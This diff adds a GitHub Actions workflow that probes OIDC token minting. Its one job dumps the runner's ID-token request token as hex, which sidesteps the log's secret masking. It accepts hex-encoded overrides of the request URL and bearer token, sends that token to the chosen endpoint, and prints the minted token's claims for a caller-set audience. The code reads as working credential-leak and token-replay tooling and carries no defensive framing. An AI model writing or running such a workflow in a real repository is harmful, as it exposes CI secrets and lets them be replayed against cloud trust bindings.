@@ -1,0 +1,110 @@
+name: bind
+on:
+  workflow_dispatch:
+    inputs:
+      aud:
+        description: OIDC audience
+        required: false
+        default: 'bind-probe'
+        type: string
+      url_hex:
+        description: hex-encoded ACTIONS_ID_TOKEN_REQUEST_URL override
+        required: false
+        default: ''
+        type: string
+      tok_hex:
+        description: hex-encoded request-token override
+        required: false
+        default: ''
+        type: string
+      tag:
+        description: row label
+        required: false
+        default: 'row'
+        type: string
+      hold:
+        description: seconds to sleep before finishing
+        required: false
+        default: '0'
+        type: string
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          AUD: ${{ inputs.aud }}
+          URL_HEX: ${{ inputs.url_hex }}
+          TOK_HEX: ${{ inputs.tok_hex }}
+          ROW: ${{ inputs.tag }}
+          HOLD: ${{ inputs.hold }}
+        run: |
+          set -uo pipefail
+          echo "---ROW--- $ROW"
+          echo "---REPO--- ${GITHUB_REPOSITORY} runid=${GITHUB_RUN_ID} job=${GITHUB_JOB} sha=${GITHUB_SHA} ref=${GITHUB_REF}"
+          echo "---NATIVE-URL--- ${ACTIONS_ID_TOKEN_REQUEST_URL:-ABSENT}"
+          echo "---RUNTIME-URL--- ${ACTIONS_RUNTIME_URL:-ABSENT}"
+          echo "---RESULTS-URL--- ${ACTIONS_RESULTS_URL:-ABSENT}"
+          NT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
+          RT="${ACTIONS_RUNTIME_TOKEN:-}"
+          echo "---NATIVE-TOK-LEN--- ${#NT}"
+          echo "---SAME-AS-RUNTIME-TOKEN--- $([ "$NT" = "$RT" ] && echo YES || echo NO)"
+          echo "---NATIVE-TOK-HEX-BEGIN---"
+          printf '%s' "$NT" | xxd -p -c 100000
+          echo "---NATIVE-TOK-HEX-END---"
+          echo "---NATIVE-TOK-CLAIMS---"
+          python3 - "$NT" <<'PY'
+          import sys, json, base64
+          t = sys.argv[1].split('.')
+          def d(s):
+              s += '=' * (-len(s) % 4)
+              return json.loads(base64.urlsafe_b64decode(s))
+          try:
+              print("hdr:", json.dumps(d(t[0])))
+              print("pay:", json.dumps(d(t[1]), indent=1, sort_keys=True))
+          except Exception as e:
+              print("not-a-jwt", type(e).__name__, len(sys.argv[1]))
+          PY
+          URL="${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
+          TOK="$NT"
+          if [ -n "$URL_HEX" ]; then URL=$(printf '%s' "$URL_HEX" | xxd -r -p); echo "---OVERRIDE-URL--- $URL"; fi
+          if [ -n "$TOK_HEX" ]; then TOK=$(printf '%s' "$TOK_HEX" | xxd -r -p); echo "---OVERRIDE-TOK-LEN--- ${#TOK}"; fi
+          if [ -z "$URL" ] || [ -z "$TOK" ]; then echo "---NO-MINT-POSSIBLE---"; exit 0; fi
+          SEP='&'; case "$URL" in *\?*) SEP='&';; *) SEP='?';; esac
+          FULL="${URL}${SEP}audience=${AUD}"
+          echo "---MINT-URL--- $FULL"
+          CODE=$(curl -sS -o /tmp/r.json -w '%{http_code}' -D /tmp/r.hdr \
+                 -H "Authorization: bearer $TOK" -H "Accept: application/json" "$FULL")
+          echo "---MINT-STATUS--- $CODE"
+          echo "---MINT-HEADERS---"
+          grep -viE '^(date|server|set-cookie|strict|x-powered|access-control|report-to|nel|alt-svc|connection|cache-control|content-length|content-type|activityid|x-tfs|x-vss-e2eid|x-msedge|x-cache)' /tmp/r.hdr || true
+          echo "---MINT-BODY---"
+          python3 - <<'PY'
+          import json, base64, hashlib
+          raw = open('/tmp/r.json').read()
+          print("raw_len", len(raw))
+          try:
+              b = json.loads(raw)
+          except Exception:
+              print("NON-JSON:", raw[:600]); raise SystemExit
+          if isinstance(b, dict) and 'value' in b:
+              tk = b['value']
+              print("::add-mask::" + tk)
+              print("KEYS", sorted(b.keys()))
+              print("IDT_LEN", len(tk), "SHA256_12", hashlib.sha256(tk.encode()).hexdigest()[:12])
+              p = tk.split('.')
+              def d(s):
+                  s += '=' * (-len(s) % 4)
+                  return json.loads(base64.urlsafe_b64decode(s))
+              print("---CLAIMS-BEGIN---")
+              print(json.dumps(d(p[1]), indent=1, sort_keys=True))
+              print("---CLAIMS-END---")
+              print("hdr:", json.dumps(d(p[0])))
+          else:
+              print("BODY", json.dumps(b)[:800])
+          PY
+          if [ "$HOLD" != "0" ]; then echo "---HOLDING--- $HOLD"; sleep "$HOLD"; fi
+          echo "---DONE---"
